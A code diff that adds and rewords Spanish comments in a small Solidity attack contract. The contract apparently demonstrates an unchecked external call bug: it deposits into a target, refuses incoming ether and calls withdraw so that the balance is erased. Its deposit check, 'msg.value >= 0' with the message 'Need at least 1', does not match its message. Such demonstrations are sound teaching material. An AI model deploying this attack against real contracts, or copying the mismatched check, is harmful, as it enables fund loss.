@@ -7,22 +7,26 @@ interface IUncheckedExternalCall {
 }
 
 contract AttackUncheckedCall {
+    // Variables
     IUncheckedExternalCall public target;
 
+    // Constructor
     constructor(address _target) {
         target = IUncheckedExternalCall(_target);
     }
 
-    // Se fuerza el fallo de la llamada: devuelve error
+    // Revertir operación de retirada: devuelve error
     receive() external payable {
         revert("No quiero recibir el credito");
     }
-
+    
+    //Función de deposito
     function deposit() public payable {
         require(msg.value >= 0, "Need at least 1");
         target.deposit{value: msg.value}();
     }
 
+    //Función de ataque
     function attack() public payable {
         target.withdraw(); // La transferencia falla, pero se borra el saldo igualmente
     }
